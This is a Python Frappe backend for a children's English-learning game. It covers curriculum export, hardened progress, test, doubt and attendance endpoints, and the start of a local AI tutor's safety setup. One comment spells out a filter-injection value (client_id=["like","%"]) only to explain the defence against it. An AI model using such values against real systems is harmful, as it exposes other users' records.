        fields=["name", "track_key", "title", "title_hi", "icon", "color", "blurb", "blurb_hi", "band", "subject",
                "video", "video_title", "video_title_hi", "video_duration_secs", "video_captions", "video_captions_hi"],
        order_by="sort_order asc, creation asc",
    )
    for t in published:
        out.append(_track_json(t, with_content=True))

    # locked / coming-soon tracks (shown greyed in the game, no lessons)
    locked = frappe.get_all(
        "Track", filters={"published": 0},
        fields=["name", "track_key", "title", "title_hi", "icon", "color", "blurb", "blurb_hi", "band", "subject"],
        order_by="sort_order asc, creation asc",
    )
    for t in locked:
        out.append(_track_json(t, with_content=False))
    return out


@frappe.whitelist(allow_guest=True)
def get_structure():
    """Grade bands + subjects metadata for the Class 1–10 navigation (cached)."""
    return _cached(STRUCTURE_CACHE_KEY, _build_structure)


def _build_structure():
    bands = frappe.get_all(
        "Grade Band", filters={"published": 1},
        fields=["band_key", "title", "title_hi", "subtitle", "subtitle_hi", "icon", "color"],
        order_by="sort_order asc, creation asc",
    )
    subjects = frappe.get_all(
        "Subject",
        fields=["subject_key", "title", "title_hi", "icon", "color"],
        order_by="sort_order asc, creation asc",
    )
    return {
        "bands": [{"key": b.band_key, "title": b.title, "titleHi": b.title_hi,
                   "subtitle": b.subtitle or "", "subtitleHi": b.subtitle_hi or "",
                   "icon": b.icon or "📚", "color": b.color or "#6c5ce7"} for b in bands],
        "subjects": [{"key": s.subject_key, "title": s.title, "titleHi": s.title_hi,
                      "icon": s.icon or "📘", "color": s.color or "#6c5ce7"} for s in subjects],
    }


def _split_lines(s):
    return [x.strip() for x in (s or "").split("\n") if x.strip() != ""]


def _track_json(t, with_content):
    track = {
        "key": t.track_key, "title": t.title, "titleHi": t.title_hi,
        "icon": t.icon, "color": t.color, "blurb": t.blurb, "blurbHi": t.blurb_hi,
        "band": t.get("band") or "", "subject": t.get("subject") or "",
        "published": bool(with_content), "lessons": [],
    }
    if not with_content:
        return track

    # Explainer video (optional, streams online-only — the game shows a friendly
    # offline card when unreachable). Keys are simply absent when no video is set,
    # so old caches and the bundled fallback COURSES need no migration.
    if (t.get("video") or "").strip():
        track["videoUrl"] = t.video.strip()
        track["videoTitle"] = t.get("video_title") or ""
        track["videoTitleHi"] = t.get("video_title_hi") or ""
        if _int(t.get("video_duration_secs")):
            track["videoDuration"] = _int(t.get("video_duration_secs"))
        if (t.get("video_captions") or "").strip():
            track["videoCaptions"] = t.video_captions.strip()
        if (t.get("video_captions_hi") or "").strip():
            track["videoCaptionsHi"] = t.video_captions_hi.strip()

    lessons = frappe.get_all(
        "Lesson", filters={"track": t.name, "published": 1},
        fields=["name", "lesson_key", "title", "title_hi",
                "video", "video_title", "video_title_hi", "video_duration_secs"],
        order_by="sort_order asc, creation asc",
    )
    for l in lessons:
        words = []
        for w in frappe.get_all("Lesson Word", filters={"parent": l.name},
                                fields=["en", "hi", "pron", "emoji", "word_type", "uncountable", "plural", "use_en", "use_hi"],
                                order_by="idx asc"):
            word = {"en": w.en, "hi": w.hi, "pron": w.pron, "emoji": w.emoji}
            if w.word_type:
                word["type"] = w.word_type
            if w.use_en:
                word["use"] = w.use_en
                word["useHi"] = w.use_hi or ""
            if w.uncountable:
                word["uncount"] = True
            else:
                word["plural"] = w.plural or (w.en + "s")
            words.append(word)

        dialogues = []
        for d in frappe.get_all("Dialogue", filters={"lesson": l.name},
                                fields=["name", "who", "line", "line_hi", "followup"],
                                order_by="sort_order asc, creation asc"):
            replies = [{"text": r.text, "textHi": r.text_hi or "", "ok": bool(r.is_correct)}
                       for r in frappe.get_all("Dialogue Reply", filters={"parent": d.name},
                                               fields=["text", "text_hi", "is_correct"], order_by="idx asc")]
            dialogues.append({"who": d.who or "🙂", "line": d.line, "lineHi": d.line_hi,
                              "then": d.followup, "replies": replies})

        code = []
        for c in frappe.get_all("Lesson Code", filters={"parent": l.name},
                                fields=["prompt", "prompt_hi", "teach", "teach_hi", "code", "choices", "answer"],
                                order_by="idx asc"):
            code.append({
                "prompt": c.prompt, "promptHi": c.prompt_hi,
                "teach": c.teach or "", "teachHi": c.teach_hi or "",
                "lines": (c.code or "").split("\n"),
                "choices": _split_lines(c.choices),
                "answer": (c.answer or "").strip(),
            })

        fix = []
        for x in frappe.get_all("Lesson Fix", filters={"parent": l.name},
                                fields=["sentence", "wrong_word", "correction", "teach", "teach_hi"],
                                order_by="idx asc"):
            fix.append({
                "sentence": x.sentence, "wrongWord": x.wrong_word, "fix": x.correction,
                "teach": x.teach or "", "teachHi": x.teach_hi or "",
            })

        email = []
        for e in frappe.get_all("Lesson Email", filters={"parent": l.name},
                                fields=["scenario", "scenario_hi", "spec_json"],
                                order_by="idx asc"):
            try:
                spec = json.loads(e.spec_json or "{}")
            except Exception:
                spec = {}
            email.append({
                "scenario": e.scenario, "scenarioHi": e.scenario_hi or "",
                "to": spec.get("to", ""), "from": spec.get("from", ""),
                "slots": spec.get("slots", []),
            })

        quiz = []
        for q in frappe.get_all("Lesson Quiz", filters={"parent": l.name},
                                fields=["question", "question_hi", "emoji", "choices", "answer", "teach", "teach_hi"],
                                order_by="idx asc"):
            quiz.append({
                "q": q.question, "qHi": q.question_hi or "", "emoji": q.emoji or "",
                "choices": _split_lines(q.choices),
                "answer": (q.answer or "").strip(), "teach": q.teach or "", "teachHi": q.teach_hi or "",
            })

        read = []
        for r in frappe.get_all("Lesson Read", filters={"parent": l.name},
                                fields=["title", "title_hi", "emoji", "passage", "passage_hi",
                                        "question", "question_hi", "choices", "answer", "teach", "teach_hi"],
                                order_by="idx asc"):
            read.append({
                "title": r.title or "", "titleHi": r.title_hi or "", "emoji": r.emoji or "",
                "text": r.passage or "", "textHi": r.passage_hi or "",
                "q": r.question or "", "qHi": r.question_hi or "",
                "choices": _split_lines(r.choices), "answer": (r.answer or "").strip(),
                "teach": r.teach or "", "teachHi": r.teach_hi or "",
            })

        reply = []
        for e in frappe.get_all("Lesson Reply", filters={"parent": l.name},
                                fields=["from_name", "subject", "message", "message_hi", "spec_json"],
                                order_by="idx asc"):
            try:
                spec = json.loads(e.spec_json or "{}")
            except Exception:
                spec = {}
            reply.append({
                "from": e.from_name or "", "subject": e.subject or "",
                "msg": e.message or "", "msgHi": e.message_hi or "",
                "slots": spec.get("slots", []),
            })

        ld = {
            "key": l.lesson_key, "title": l.title, "titleHi": l.title_hi,
            "words": words, "dialogues": dialogues, "code": code, "fix": fix,
            "email": email, "quiz": quiz, "read": read, "reply": reply,
        }
        # optional per-lesson explainer video (YouTube link or file URL) — keys absent when unset
        if (l.get("video") or "").strip():
            ld["videoUrl"] = l.video.strip()
            ld["videoTitle"] = l.get("video_title") or ""
            ld["videoTitleHi"] = l.get("video_title_hi") or ""
            if _int(l.get("video_duration_secs")):
                ld["videoDuration"] = _int(l.get("video_duration_secs"))
        track["lessons"].append(ld)

    # Module test: the question bank ships WITH the curriculum so tests work fully
    # offline (answers therefore exist in the client payload — accepted tradeoff: the
    # audience is not dev-tools-savvy, and the anti-cheat targets the realistic threat
    # of switching apps to ask/look up, not payload inspection). teach/teach_hi are
    # deliberately NOT exported — no hints inside a test.
    mt = frappe.db.get_value("Module Test", {"track": t.name, "active": 1},
                             ["name", "questions_per_paper", "pass_pct", "time_limit_secs",
                              "intro", "intro_hi"], as_dict=True)
    if mt:
        bank = [{"id": q.name, "q": q.question, "qHi": q.question_hi or "",
                 "emoji": q.emoji or "", "choices": _split_lines(q.choices),
                 "answer": (q.answer or "").strip()}
                for q in frappe.get_all("Module Test Question", filters={"parent": mt.name},
                                        fields=["name", "question", "question_hi", "emoji",
                                                "choices", "answer"], order_by="idx asc")]
        if bank:
            track["test"] = {"questionsPerPaper": _int(mt.questions_per_paper) or 10,
                             "passPct": _int(mt.pass_pct) or 60,
                             "timeLimitSecs": _int(mt.time_limit_secs) or 600,
                             "intro": mt.intro or "", "introHi": mt.intro_hi or "",
                             "bank": bank}
    return track


# Providers the site can actually authenticate against, in the order they should be shown.
# `social_login_provider` is Frappe's own field; the redirect URL it builds is the documented
# entry point (frappe.integrations.oauth2_logins), so we are not inventing an auth route.
_SOCIAL_LABELS = {"Google": "Google", "Facebook": "Facebook", "GitHub": "GitHub"}


def _enabled_social_logins():
    if not frappe.db.exists("DocType", "Social Login Key"):
        return []
    out = []
    try:
        rows = frappe.get_all("Social Login Key",
                              filters={"enable_social_login": 1},
                              fields=["name", "provider_name", "social_login_provider"],
                              order_by="creation asc")
    except Exception:
        return []
    for r in rows:
        key = r.social_login_provider or r.provider_name or r.name
        label = _SOCIAL_LABELS.get(key, r.provider_name or key)
        out.append({"key": str(key).lower(), "label": label,
                    "url": "/api/method/frappe.integrations.oauth2_logins.login_via_%s"
                           % str(key).lower()})
    return out


@frappe.whitelist(allow_guest=True)
def get_settings():
    return _cached(SETTINGS_CACHE_KEY, _build_settings)


def _build_settings():
    s = frappe.get_single("Hikmat Settings")
    return {
        "appName": s.app_name or "Hikmat",
        "logo": s.logo or "",
        "taglineEn": s.tagline_en or "Learn English by playing",
        "taglineHi": s.tagline_hi or "",
        "defaultLanguage": s.default_language or "en",
        "helpDefaultOn": bool(s.help_default_on),
        "defaultTheme": s.get("default_theme") or "light",
        "defaultSound": bool(s.get("default_sound")),
        # Which "Continue with X" buttons to draw. Read from Frappe's OWN Social Login Key
        # doctype rather than a flag of ours, so the app can never offer a provider the server
        # cannot actually complete a handshake with: enable the key in Desk and the button
        # appears, disable it and the button goes. Only the provider name and its sign-in URL
        # cross the wire — never the client id, and certainly never the secret.
        "socialLogins": _enabled_social_logins(),
        # Only the on/off flags are public — the model, endpoints, system prompt and crisis
        # copy stay server-side (read from the Single inside ai_ask/ai_transcribe/ai_tts),
        # never in this cached payload that any guest can fetch.
        "aiEnabled": bool(s.get("ai_enabled")),
        "voiceEnabled": bool(s.get("voice_enabled")),
        # Guardian phone verification. Only the flag and the WORDING are public — never the
        # phone number id or the token. The wording travels server→client on purpose: the
        # consent record snapshots this same constant, so the text a guardian saw and the text
        # we filed as agreed-to are provably the same string. A stale cached client showing
        # older wording is the one case they can differ, which is why the version rides along
        # and is stored beside the snapshot.
        # bool(_otp_config()), NOT the raw tickbox: the client uses this to decide whether to
        # SHOW the guardian gate INSTEAD OF the consent tickbox, so publishing "enabled but
        # unable to send" hides the only working door behind one that cannot open.
        "otpEnabled": bool(_otp_config()),
        "consentVersion": _CONSENT_VERSION,
        "consentText": _CONSENT_TEXT_EN,
        "consentTextHi": _CONSENT_TEXT_HI,
    }


# ---------------------------------------------------------------------------
# Progress write (untrusted input — validate + clamp + flood-cap)
# ---------------------------------------------------------------------------
@frappe.whitelist(allow_guest=True)
def submit_attempt(student=None, token=None, track=None, lesson=None, activity=None,
                   stars=0, score=0, total=0, coins=0, duration_secs=0, client_id=None):
    """Record one finished activity. Called by the game on the result screen.
    Everything here is attacker-controllable, so: verify the student exists & is
    active, require the student's login token (no forging attempts for others),
    clamp every number to sane bounds, and cap write volume per IP.
    client_id makes the write idempotent — a retry after a partial success (the
    classic offline-queue double-insert) returns the existing row instead of a copy."""
    if not _rate_ok("submit:" + _client_ip(), 3000, 3600):   # flood ceiling; well above a real classroom
        return {"ok": False, "error": "rate_limited"}
    # Scalars only (see _docname): `student` is an SQL bind + a Link write, and `client_id` is
    # the dedup FILTER value — client_id=["like","%"] would otherwise match a CLASSMATE's row
    # and return her attempt name as this call's "dedup" answer. Content keys are normalised
    # once here (see _content_key) because they are stored AND rendered in Desk reports.
    student, client_id = _docname(student), _docname(client_id, 64)
    track, lesson, activity = _content_key(track), _content_key(lesson), _content_key(activity)
    if not student:
        student = _session_student()                         # online client authed by session, may omit id
    if not student:
        return {"ok": False, "error": "unknown_student"}
    if client_id:                                            # already recorded this exact attempt? done.
        existing = frappe.db.get_value("Lesson Attempt", {"client_id": client_id}, "name")
        if existing:
            return {"ok": True, "name": existing, "dedup": True}
    sinfo = frappe.db.get_value("Student", student, ["student_name", "cohort", "active"], as_dict=True)
    if not sinfo or not sinfo.active:
        return {"ok": False, "error": "unknown_student"}
    if not _authorized(student, token):                      # campus token OR online session
        return {"ok": False, "error": "auth"}

    total = max(0, _int(total))
    score = max(0, _int(score))
    if total:
        score = min(score, total)
    try:
        doc = frappe.get_doc({
            "doctype": "Lesson Attempt", "client_id": client_id or None,
            "student": student, "student_name": sinfo.get("student_name"), "cohort": sinfo.get("cohort"),
            "track": track, "lesson": lesson, "activity": activity,   # normalised above
            "stars": max(0, min(3, _int(stars))),          # an activity is worth 0–3 stars
            "score": score, "total": total,
            "coins": max(0, min(1000, _int(coins))),
            "duration_secs": max(0, min(7200, _int(duration_secs))),   # 2h cap kills left-open-overnight noise
            "attempted_on": frappe.utils.now(),
        }).insert(ignore_permissions=True)
    except frappe.DuplicateEntryError:                       # raced with another submit of the same client_id
        frappe.db.rollback()
        existing = frappe.db.get_value("Lesson Attempt", {"client_id": client_id}, "name")
        return {"ok": True, "name": existing, "dedup": True}
    frappe.db.commit()
    return {"ok": True, "name": doc.name}


_TEST_STATUS = {"completed": "Completed", "exited": "Exited", "timed_out": "Timed Out"}


@frappe.whitelist(allow_guest=True)
def submit_test(student=None, token=None, track=None, paper=None, score=0, total=0,
                status=None, exit_reason=None, duration_secs=0, lang=None, client_id=None):
    """Record one module-test attempt (the mandatory end-of-track test). Same
    hardening as submit_attempt: rate cap, client_id idempotency, active-student +
    token check, clamps. Two rules are SERVER-enforced so the client can't soften
    them: an Exited (anti-cheat voided) attempt always scores 0, and pass/fail is
    recomputed here against the Module Test's pass_pct — a timed-out paper still
    counts what was answered (running out of time is not cheating)."""
    if not _rate_ok("testsub:" + _client_ip(), 600, 3600):   # tests are ~10× rarer than activities
        return {"ok": False, "error": "rate_limited"}
    student, client_id = _docname(student), _docname(client_id, 64)   # scalars only, as submit_attempt
    track, lang = _content_key(track), _content_key(lang, 10)         # stored AND used as a filter below
    if not student:
        student = _session_student()
    if not student:
        return {"ok": False, "error": "unknown_student"}
    if client_id:
        existing = frappe.db.get_value("Test Attempt", {"client_id": client_id}, "name")
        if existing:
            return {"ok": True, "name": existing, "dedup": True}
    sinfo = frappe.db.get_value("Student", student, ["student_name", "cohort", "active"], as_dict=True)
    if not sinfo or not sinfo.active:
        return {"ok": False, "error": "unknown_student"}
    if not _authorized(student, token):
        return {"ok": False, "error": "auth"}

    st = _TEST_STATUS.get(_docname(status, 20).lower())   # a dict/list here is simply not a status
    if not st:
        return {"ok": False, "error": "bad_status"}
    total = max(0, _int(total))
    score = min(max(0, _int(score)), total)
    if st == "Exited":                                       # voiding is not client-optional
        score = 0
    # exit_reason is a client-authored LABEL ("tab_hidden", "blur") that the facilitator's
    # test report renders and exports — identifier-shaped, not her prose, so it gets the
    # formula-lead strip too (see _no_formula_lead).
    exit_reason = _content_key(exit_reason, 40) if st == "Exited" else ""
    try:
        ids = json.loads(paper or "[]")
        ids = [str(x)[:140] for x in ids[:100]] if isinstance(ids, list) else []
    except Exception:
        ids = []                                             # telemetry only — never reject the write

    pass_pct = 60
    track_doc = frappe.db.get_value("Track", {"track_key": track}, "name")   # scalar (see above)
    if track_doc:
        pass_pct = _int(frappe.db.get_value("Module Test", {"track": track_doc}, "pass_pct")) or 60
    pct = round(100 * score / total) if total else 0
    passed = 1 if st in ("Completed", "Timed Out") and pct >= pass_pct else 0

    try:
        doc = frappe.get_doc({
            "doctype": "Test Attempt", "client_id": client_id or None,
            "student": student, "student_name": sinfo.get("student_name"), "cohort": sinfo.get("cohort"),
            "track": track, "paper": json.dumps(ids),
            "score": score, "total": total, "pct": pct, "passed": passed,
            "status": st, "exit_reason": exit_reason,
            "duration_secs": max(0, min(7200, _int(duration_secs))),
            "lang": lang,
            "attempted_on": frappe.utils.now(),
        }).insert(ignore_permissions=True)
    except frappe.DuplicateEntryError:                       # raced with a retry of the same client_id
        frappe.db.rollback()
        existing = frappe.db.get_value("Test Attempt", {"client_id": client_id}, "name")
        return {"ok": True, "name": existing, "dedup": True}
    frappe.db.commit()
    return {"ok": True, "name": doc.name, "passed": bool(passed), "pct": pct}


# ---------------------------------------------------------------------------
# Gems — the only progress metric the app rewards. There used to be "belt" gates on top of
# these: crossing a gem threshold created a Pending Evaluation and LOCKED every new lesson
# until a facilitator marked it Passed in Desk. Removed 2026-08-26 (v17) — a learner should
# never be stopped by an adult's queue. Gems themselves are unchanged.
# ---------------------------------------------------------------------------
def _total_gems(student):
    """A student's global gem total 💎 = SUM of coins over every lesson attempt
    (score*5 + stars*10 each) — mirrors the client's state.coins, and unlike stars it keeps
    growing on replays, so practice keeps counting toward the next belt.

    Corpus XP used to be added here too. The Bhojpuri AI / Boli pipeline is gone and its
    ledger table with it, so lesson attempts are now the whole story."""
    r = frappe.db.sql(
        "select coalesce(sum(coins), 0) from `tabLesson Attempt` where student=%s", student)
    return int(r[0][0]) if r else 0


def validate_cohort(doc, method=None):
    """doc_events hook: mandatory_depends_on only guards the Desk FORM — enforce the
    same rule server-side so an API/script insert can't create an undated Offline batch."""
    if (doc.mode or "Offline") == "Offline" and not doc.start_date:
        frappe.throw(_("An Offline cohort needs a start date."), frappe.MandatoryError)


def stamp_evaluation(doc, method=None):
    """doc_events hook: when a facilitator sets an outcome in Desk, stamp who/when."""
    if doc.status in ("Passed", "Needs Practice") and not doc.evaluated_on:
        doc.evaluated_by = frappe.session.user
        doc.evaluated_on = frappe.utils.now()


# ---------------------------------------------------------------------------
# "Roshni, mujhe doubt hai" — a learner taps for help; we log it for the
# facilitator confusion heatmap. Untrusted input → validate, clamp, flood-cap.
# Guests may raise doubts too (anonymous confusion data is still useful to a
# teacher watching the room), so a student id is optional here.
# ---------------------------------------------------------------------------
@frappe.whitelist(allow_guest=True)
def report_doubt(student=None, token=None, track=None, lesson=None, activity=None,
                 question=None, lang=None, client_id=None):
    """Record one 'I'm stuck' tap. Idempotent on client_id so the offline queue can
    retry safely. A logged-in student must present their token (no forging for others);
    an anonymous/guest doubt is accepted with no student attached."""
    if not _rate_ok("doubt:" + _client_ip(), 2000, 3600):   # generous ceiling; never trips real classroom use
        return {"ok": False, "error": "rate_limited"}
    student, client_id = _docname(student), _docname(client_id, 64)   # scalars only (see _docname)
    track, lesson, activity = _content_key(track), _content_key(lesson), _content_key(activity)
    lang = _content_key(lang, 10)
    # Her question is FREE TEXT: keep her words (the facilitator has to read them), drop the
    # markup. It is stored on Lesson Doubt AND copied into the Desk bell below, so an
    # unsanitised value would execute in two places, not one.
    question = _plain_text(question)[:500]
    if client_id:                                            # already logged this tap? done.
        existing = frappe.db.get_value("Lesson Doubt", {"client_id": client_id}, "name")
        if existing:
            return {"ok": True, "name": existing, "dedup": True}

    sname, cohort = None, None
    if not student:
        student = _session_student()                         # online client may rely on its session
    if student:
        sinfo = frappe.db.get_value("Student", student, ["student_name", "cohort", "active"], as_dict=True)
        if not sinfo or not sinfo.active:
            return {"ok": False, "error": "unknown_student"}
        if not _authorized(student, token):                  # campus token OR online session
            return {"ok": False, "error": "auth"}
        sname, cohort = sinfo.get("student_name"), sinfo.get("cohort")

    try:
        doc = frappe.get_doc({
            "doctype": "Lesson Doubt", "client_id": client_id or None,
            "student": student or None, "student_name": sname, "cohort": cohort,
            "track": track, "lesson": lesson, "activity": activity,   # normalised above
            "question": question, "lang": lang,
            "raised_on": frappe.utils.now(),
        }).insert(ignore_permissions=True)
    except frappe.DuplicateEntryError:                       # raced with another retry of the same client_id
        frappe.db.rollback()
        existing = frappe.db.get_value("Lesson Doubt", {"client_id": client_id}, "name")
        return {"ok": True, "name": existing, "dedup": True}
    frappe.db.commit()
    # Ping the facilitators' Desk so "I'm stuck" reaches a human (AI tutor is deferred).
    who = sname or _("a learner")
    _notify_facilitators(_("🙋 Doubt from {0}: {1}").format(who, question[:80]),   # already plain text
                         "Lesson Doubt", doc.name)
    return {"ok": True, "name": doc.name}


@frappe.whitelist(allow_guest=True)
def log_event(student=None, token=None, kind=None, track=None, lesson=None, activity=None,
              question=None, chosen=None, answer=None, lang=None, client_id=None,
              tool=None, duration_secs=None, count=None):
    """Record one fine-grained learning event. Mirrors report_doubt: idempotent on
    client_id, offline-queue friendly, guests allowed (anonymous data still tells the
    teacher which QUESTION or ACTIVITY is broken). No notification — this is a
    high-volume analytics stream, not an alert. Kinds:
      wrong_answer — the exact question a learner missed and what she picked instead
      dwell        — time spent on an activity she LEFT without finishing (finished
                     time rides on Lesson Attempt.duration_secs); duration_secs
      tool_use     — batched taps of a UI tool (listen / lang_switch / replay …);
                     tool + count, aggregated client-side per activity
      test_exit    — a module test was voided by the anti-cheat guard; tool carries
                     the reason (hidden/blur/fullscreen_exit/pagehide/stopped),
                     duration_secs = seconds into the test, count = question reached"""
    if not _rate_ok("event:" + _client_ip(), 6000, 3600):   # wrong answers come in bursts; keep the ceiling high
        return {"ok": False, "error": "rate_limited"}
    if kind not in ("wrong_answer", "dwell", "tool_use", "test_exit"):
        return {"ok": False, "error": "bad_kind"}
    student, client_id = _docname(student), _docname(client_id, 64)   # scalars only (see _docname)
    # EVERY string on this row is learner-authored and every one of them is a column in the
    # facilitator's "Wrong Answers" / "Student Engagement" reports — question/chosen/answer are
    # literally the text of a quiz option she typed or tapped. Normalise them all.
    track, lesson, activity = _content_key(track), _content_key(lesson), _content_key(activity)
    tool, lang = _content_key(tool, 40), _content_key(lang, 10)
    question, chosen, answer = (_plain_text(question)[:140], _plain_text(chosen)[:140],
                                _plain_text(answer)[:140])
    duration_secs = max(0, min(7200, _int(duration_secs)))  # same 2h sanity cap as attempts
    count = max(1, min(1000, _int(count) or 1))
    if kind == "dwell" and duration_secs <= 0:
        return {"ok": False, "error": "bad_duration"}
    if kind == "tool_use" and not tool:
        return {"ok": False, "error": "bad_tool"}
    if client_id:
        existing = frappe.db.get_value("Learning Event", {"client_id": client_id}, "name")
        if existing:
            return {"ok": True, "name": existing, "dedup": True}

    sname, cohort = None, None
    if not student:
        student = _session_student()
    if student:
        sinfo = frappe.db.get_value("Student", student, ["student_name", "cohort", "active"], as_dict=True)
        if not sinfo or not sinfo.active:
            return {"ok": False, "error": "unknown_student"}
        if not _authorized(student, token):
            return {"ok": False, "error": "auth"}
        sname, cohort = sinfo.get("student_name"), sinfo.get("cohort")

    try:
        doc = frappe.get_doc({
            "doctype": "Learning Event", "client_id": client_id or None,
            "student": student or None, "student_name": sname, "cohort": cohort,
            "kind": kind,
            "track": track, "lesson": lesson, "activity": activity,   # normalised above
            "tool": tool,
            "duration_secs": duration_secs, "count": count,
            "question": question, "chosen": chosen, "answer": answer,
            "lang": lang,
            "occurred_on": frappe.utils.now(),
        }).insert(ignore_permissions=True)
    except frappe.DuplicateEntryError:
        frappe.db.rollback()
        existing = frappe.db.get_value("Learning Event", {"client_id": client_id}, "name")
        return {"ok": True, "name": existing, "dedup": True}
    frappe.db.commit()
    return {"ok": True, "name": doc.name}


# ---------------------------------------------------------------------------
# Attendance — the game banks a logged-in student's ACTIVE screen time on-device
# and flushes it here in small deltas (offline-queued, idempotent). Two tiers:
# Attendance Ping is the raw audit log (client_id-deduped), Attendance Day is the
# per-(student, local-date) aggregate the facilitator reports read. Facilitator
# report only — nothing about attendance is ever shown to students.
# ---------------------------------------------------------------------------
_ATT_PING_MAX_SECS = 900        # one ping can never claim more than 15 minutes
_ATT_PAST_WINDOW_DAYS = 30      # matches the client's day store — a campus laptop
                                # that stays offline for weeks must not lose real
                                # attendance when it finally syncs
_ATT_FUTURE_WINDOW_DAYS = 1     # tolerate a device clock slightly ahead


@frappe.whitelist(allow_guest=True)
def log_attendance(student=None, token=None, date=None, secs=0, client_id=None, device_id=None):
    """Record one active-time delta. The client's LOCAL date is the day-of-record
    (campus devices are offline; server date would misfile late-night syncs), and
    received_on keeps the server-side audit anchor. The 900s per-ping cap means
    forging a Present day (>=150 min) takes 10+ pings with unique client_ids —
    visible in the audit trail — rather than one big number."""
    if not _rate_ok("att:" + _client_ip(), 2000, 3600):     # a 30-laptop room ≈ 360/hr
        return {"ok": False, "error": "rate_limited"}
    student, client_id = _docname(student), _docname(client_id, 64)   # scalars only (see _docname)
    device_id = _content_key(device_id, 60)   # client-authored IDENTIFIER; the attendance
                                              # report renders + exports it (formula lead out)
    if not student:
        student = _session_student()
    if not student:
        return {"ok": False, "error": "unknown_student"}
    if client_id:
        existing = frappe.db.get_value("Attendance Ping", {"client_id": client_id}, "name")
        if existing:
            return {"ok": True, "dedup": True}
    sinfo = frappe.db.get_value("Student", student,
                                ["student_name", "cohort", "campus", "active"], as_dict=True)
    if not sinfo or not sinfo.active:
        return {"ok": False, "error": "unknown_student"}
    if not _authorized(student, token):
        return {"ok": False, "error": "auth"}

    try:
        d = frappe.utils.getdate(date)
    except Exception:
        return {"ok": False, "error": "bad_date"}
    today = frappe.utils.getdate()
    if (today - d).days > _ATT_PAST_WINDOW_DAYS or (d - today).days > _ATT_FUTURE_WINDOW_DAYS:
        return {"ok": False, "error": "date_out_of_range"}
    secs = max(0, min(_ATT_PING_MAX_SECS, _int(secs)))
    if secs <= 0:
        return {"ok": False, "error": "bad_secs"}

    # Upsert the Day aggregate FIRST, then insert the Ping. If the ping insert races
    # a duplicate client_id, the rollback undoes the day increment too — so the
    # dedup ledger (pings) and the aggregate can never drift apart. (Inserting the
    # ping first would let a raced Day insert roll the ping away while keeping the
    # seconds — the classic double-count on retry.)
    min_minutes = _int(frappe.db.get_single_value("Hikmat Settings", "attendance_min_minutes")) or 150
    now = frappe.utils.now()
    for _attempt in range(2):
        day_name = frappe.db.get_value("Attendance Day", {"student": student, "date": d}, "name")
        try:
            if day_name:
                frappe.db.sql(
                    """update `tabAttendance Day`
                       set active_secs = active_secs + %s, last_ping = %s,
                           present = (active_secs >= %s)
                       where name = %s""",
                    (secs, now, min_minutes * 60, day_name))
            else:
                frappe.get_doc({
                    "doctype": "Attendance Day", "student": student,
                    "student_name": sinfo.get("student_name"), "cohort": sinfo.get("cohort"),
                    "campus": sinfo.get("campus"), "date": d,
                    "active_secs": secs, "present": 1 if secs >= min_minutes * 60 else 0,
                    "device_count": 1, "first_ping": now, "last_ping": now,
                }).insert(ignore_permissions=True)
            frappe.get_doc({
                "doctype": "Attendance Ping", "client_id": client_id or None,
                "student": student, "student_name": sinfo.get("student_name"),
                "date": d, "secs": secs, "device_id": device_id,   # normalised above
                "received_on": now,
            }).insert(ignore_permissions=True)
            break
        except frappe.DuplicateEntryError:
            frappe.db.rollback()
            # Either the same client_id landed twice (→ dedup, done) or two devices
            # raced the first Day insert (→ retry once; the update path now wins).
            if client_id and frappe.db.get_value("Attendance Ping", {"client_id": client_id}, "name"):
                return {"ok": True, "dedup": True}
    else:
        return {"ok": False, "error": "conflict"}

    # device_count from the audit trail (cheap: one day's pings for one student)
    total, devices = frappe.db.sql(
        """select coalesce(sum(secs), 0), count(distinct device_id)
           from `tabAttendance Ping` where student=%s and date=%s""", (student, d))[0]
    frappe.db.sql("update `tabAttendance Day` set device_count=%s where student=%s and date=%s",
                  (max(1, _int(devices)), student, d))
    frappe.db.commit()
    return {"ok": True, "secs_today": _int(total), "present": _int(total) >= min_minutes * 60}


def prune_attendance_pings():
    """Daily housekeeping (hooks.py scheduler): raw pings older than 90 days are only
    needed for client_id dedup and short-term audit — the client's own queue/day-store
    horizon is 30 days, so a 90-day retention can never re-admit a replayed ping."""
    try:
        frappe.db.sql("delete from `tabAttendance Ping` where received_on < %s",
                      frappe.utils.add_days(frappe.utils.now(), -90))
        frappe.db.commit()
    except Exception:
        frappe.log_error(frappe.get_traceback(), "prune_attendance_pings")


# ---------------------------------------------------------------------------
# "Roshni AI" — the local-Ollama voice/text tutor. The game posts a child's typed
# (later: spoken→transcribed) doubt here; we forward it to a LOCAL Ollama model on
# this machine and speak the Hindi reply back. This is the ONLY place that talks to
# the model, so safety, logging, and the system prompt all live server-side where
# client JS can't bypass them. The feature is purely ADDITIVE: if anything here fails
# the game falls back to the always-present scripted "Roshni" help. See SECURITY.md.
#
# Defence-in-depth (MVP floor): fail-CLOSED rate limit → require a consented, logged-in
# student → PII-redact before persisting → deterministic crisis short-circuit (never
# calls the model) → bounded Ollama call → output filter → log every turn for the
# facilitator review queue. A guard model + real-time crisis escalation come next.
# ---------------------------------------------------------------------------

# Fallback system prompt if Hikmat Settings has none (the editable copy lives in the
# Single so a facilitator can tune Roshni's voice without a code change).
_DEFAULT_AI_PROMPT = (
    'तुम "रोशनी" हो — चंपारण, बिहार की छोटी बच्चियों की एक प्यारी, मददगार टीचर-दीदी। '
    "एकदम आसान, रोज़मर्रा की हिंदी में बात करो (आम अंग्रेज़ी शब्द चल जाते हैं); कठिन या "
    "किताबी शब्द मत इस्तेमाल करो; छोटे-छोटे वाक्य। हमेशा हिम्मत देने वाले अंदाज़ में, "
    "जवाब छोटा रखो (2-4 वाक्य), फिर एक आसान सवाल पूछो। ग़लती पर डाँटो मत, प्यार से सही बताओ। "
    "सिर्फ़ पढ़ाई से जुड़ी बातें करो; कोई डरावनी, बड़ों वाली या ग़लत बात हो तो जवाब मत दो — "
    'कहो "ये बात किसी बड़े से पूछना, चलो कुछ मज़ेदार सीखते हैं!"। कभी फ़ोन नंबर, पता या '
    "निजी जानकारी मत माँगो। reasoning या सोच-विचार मत दिखाओ, सीधे हिंदी में जवाब दो।"
)
_DEFAULT_CRISIS_REPLY = (
    "यह बात किसी बड़े — अपनी टीचर या घर के किसी बड़े — से ज़रूर कहो, वे तुम्हारी मदद करेंगे। "
    "चलो, हम कुछ आसान और मज़ेदार सीखते हैं। 💛"
)
_PROMPT_VERSION = "mvp-1"

# Best-effort PII scrubbing BEFORE anything is persisted. Regex catches structured PII
# only — it will NOT catch a child naming a person/place in free text, so the stored
# transcript is "redacted on a best-effort basis", never guaranteed clean. (Design note.)
_RE_EMAIL = re.compile(r"\b[\w.+-]+@[\w-]+\.[\w.-]+\b")
